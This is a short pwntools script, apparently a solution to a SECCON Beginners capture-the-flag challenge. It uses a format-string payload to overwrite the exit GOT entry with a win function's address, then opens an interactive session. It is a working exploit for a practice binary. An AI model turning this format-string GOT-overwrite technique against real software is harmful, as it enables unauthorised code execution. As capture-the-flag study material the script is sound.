from pwn import *

elf = ELF('./chall')
io = process(elf.path)
#io = remote('pure-and-easy.beginners.seccon.games', 9000)
context.binary = elf

addr_got_exit = elf.got['exit']
addr_win = elf.symbols['win']

payload = fmtstr_payload(offset = 6, writes = {addr_got_exit: addr_win})
log.info(f'payload: {payload}')
io.sendlineafter(b'> ', payload)

io.interactive()

